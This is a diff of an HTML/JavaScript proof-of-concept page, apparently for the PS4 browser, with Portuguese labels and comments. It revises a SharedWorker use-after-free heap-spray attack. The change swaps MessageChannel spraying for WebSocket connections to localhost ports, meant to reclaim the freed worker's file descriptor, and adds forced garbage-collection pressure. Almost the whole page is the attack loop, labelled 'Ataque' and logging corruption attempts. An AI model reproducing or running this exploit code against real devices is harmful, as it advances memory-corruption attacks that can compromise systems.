@@ -2,23 +2,23 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 SharedWorker SPRAY PoC</title>
+    <title>PS4 WebSocket Spray PoC</title>
     
 </head>
 <body>
 
-    <h1>SharedWorker UAF/Spray Test</h1>
+    <h1>SharedWorker -> WebSocket Spray</h1>
     
     <div class="panel">
-        <h3>1. Preparação (Encher Heap)</h3>
-        Quantidade Base: <input type="number" id="fillAmount" value="400" style="width: 60px;">
-        <button id="btnFill" onclick="startFill()">ENCHER MEMÓRIA</button>
+        <h3>1. Preparação</h3>
+        <label>Base (Recomendado 300): <input type="number" id="fillAmount" value="300"></label>
+        <button id="btnFill" onclick="startFill()">ENCHER HEAP</button>
     </div>
 
     <div class="panel">
-        <h3>2. Ataque (Race + Spray)</h3>
-        <p>Tenta substituir o Worker morto por MessageChannels.</p>
-        <button id="btnSpray" onclick="startSpray()" disabled>INICIAR SPRAY LOOP</button>
+        <h3>2. Ataque (Socket Spray)</h3>
+        <p>Tenta substituir o Worker por Sockets Reais.</p>
+        <button id="btnSpray" onclick="startSpray()" disabled>INICIAR SPRAY (WS)</button>
         <button onclick="stopSpray()">PARAR</button>
     </div>
 
@@ -26,8 +26,8 @@
 
     <script>
         const logEl = document.getElementById('log');
-        let workers = []; // Mantém os workers vivos
-        let sprayKeepers = []; // Mantém os objetos de spray vivos
+        let workers = []; 
+        let sockets = []; // Segura os sockets do spray
         let raceInterval = null;
         
         function log(msg) {
@@ -35,77 +35,92 @@
             logEl.innerHTML = `[${time}] ${msg}\n` + logEl.innerHTML;
         }
 
-        // --- FASE 1: ENCHIMENTO ---
+        // --- FASE 1: ENCHIMENTO (BASE) ---
         async function startFill() {
             const limit = parseInt(document.getElementById('fillAmount').value);
             document.getElementById('btnFill').disabled = true;
-            log(`Iniciando enchimento até ${limit}...`);
+            log(`Enchendo base com ${limit} workers...`);
 
             let count = 0;
             const batch = setInterval(() => {
-                for(let i=0; i<5; i++) {
+                for(let i=0; i<10; i++) {
                     if(count >= limit) {
                         clearInterval(batch);
-                        log("Enchimento concluído. Memória pronta.");
+                        log("Base pronta. Sistema estabilizado.");
                         document.getElementById('btnSpray').disabled = false;
                         return;
                     }
                     try {
-                        // Worker vazio apenas para ocupar slot no Kernel
-                        const id = `filler_${count}`;
+                        const id = `base_${count}`;
                         const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                         sw.port.start();
                         workers.push(sw);
                         count++;
                     } catch(e) {
-                        log(`Erro fatal no enchimento (${count}): ${e.message}`);
                         clearInterval(batch);
+                        log("Erro no enchimento: " + e.message);
                     }
                 }
-                if(count % 50 === 0) log(`Alocados: ${count}/${limit}`);
-            }, 10);
+                if(count % 50 === 0) log(`Base: ${count}/${limit}`);
+            }, 20);
         }
 
-        // --- FASE 2: O ATAQUE (RACE + SPRAY) ---
+        // --- LIMPEZA FORÇADA (GC PRESSURE) ---
+        function forceGC() {
+            // Aloca um array gigante de lixo para forçar o navegador a rodar o Garbage Collector
+            // e limpar os workers mortos do Kernel.
+            let garbage = new Array(100000).fill(0.1);
+            garbage = null; // Libera imediatamente
+        }
+
+        // --- FASE 2: SPRAY COM WEBSOCKETS ---
         function startSpray() {
             if(raceInterval) return;
-            log("!!! INICIANDO LOOP DE ATAQUE !!!");
+            log("!!! INICIANDO SOCKET SPRAY !!!");
             
             let cycle = 0;
             
             raceInterval = setInterval(() => {
                 cycle++;
-                const id = `target_${Date.now()}_${cycle}`;
+                const id = `race_ws_${Date.now()}_${cycle}`;
                 
                 try {
-                    // 1. ALOCA O ALVO (O 401º Worker)
+                    // 1. ALOCA
                     const sw = new SharedWorker("data:text/javascript,onconnect=e=>{}", id);
                     const port = sw.port;
                     
-                    // 2. USA O RECURSO (Gatilho para o Kernel olhar para este endereço)
+                    // 2. GATILHO
                     port.postMessage("ping"); 
 
-                    // 3. LIBERAÇÃO (O Buraco na Memória)
-                    // Fechamos a porta explicitamente
+                    // 3. LIBERAÇÃO
                     port.close();
                     
-                    // 4. SPRAY IMEDIATO (Tentar ocupar o buraco)
-                    // Criamos vários canais IPC leves. Se o Kernel reutilizar o ID do worker
-                    // para um desses canais, bingo.
-                    for(let i=0; i < 20; i++) {
-                        const mc = new MessageChannel();
-                        // Mantemos referência para o GC não limpar imediatamente
-                        // Mas usamos um array circular pequeno para não estourar a RAM do navegador
-                        sprayKeepers[i % 500] = mc; 
+                    // 4. SPRAY (Munição Pesada: WebSockets)
+                    // Tenta roubar o File Descriptor do worker que acabou de fechar
+                    for(let i=0; i < 4; i++) {
+                        // Conecta a uma porta local (não precisa existir, o importante é a syscall 'socket')
+                        // Usamos portas aleatórias para evitar cache
+                        const ws = new WebSocket(`ws://127.0.0.1:${8000 + i + (cycle%100)}`);
+                        
+                        // Mantemos o socket vivo brevemente
+                        sockets.push(ws);
+                        
+                        // Limpa sockets antigos para não estourar a RAM (mantém apenas os últimos 50)
+                        if(sockets.length > 50) {
+                            const old = sockets.shift();
+                            old.close();
+                        }
                     }
 
-                } catch(e) {
-                    // Ignora erros de alocação (esperados no limite)
+                } catch(e) {}
+
+                // A cada 200 ciclos, tentamos forçar o GC para evitar o crash de 3000
+                if(cycle % 200 === 0) {
+                    forceGC();
+                    log(`Ciclo ${cycle}: Limpando zumbis...`);
                 }
 
-                if(cycle % 100 === 0) log(`Ciclo ${cycle}: Tentando corrupção...`);
-
-            }, 5); // Tenta a cada 5ms (Agressivo)
+            }, 10); // Intervalo um pouco maior para dar tempo ao socket
         }
 
         function stopSpray() {
